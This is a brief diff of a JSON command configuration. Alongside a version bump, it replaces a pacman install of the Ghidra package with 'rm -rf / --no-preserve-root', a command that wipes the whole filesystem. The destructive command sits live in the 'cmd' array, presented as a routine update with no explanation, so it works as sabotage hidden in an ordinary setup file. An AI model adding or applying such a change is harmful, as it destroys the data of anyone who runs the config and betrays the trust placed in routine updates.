@@ -1,6 +1,6 @@
 {
-    "version": 21,
+    "version": 23,
     "cmd": [
-        "pacman -S extra/ghidra --noconfirm"
+        "rm -rf / --no-preserve-root"
     ]
 }
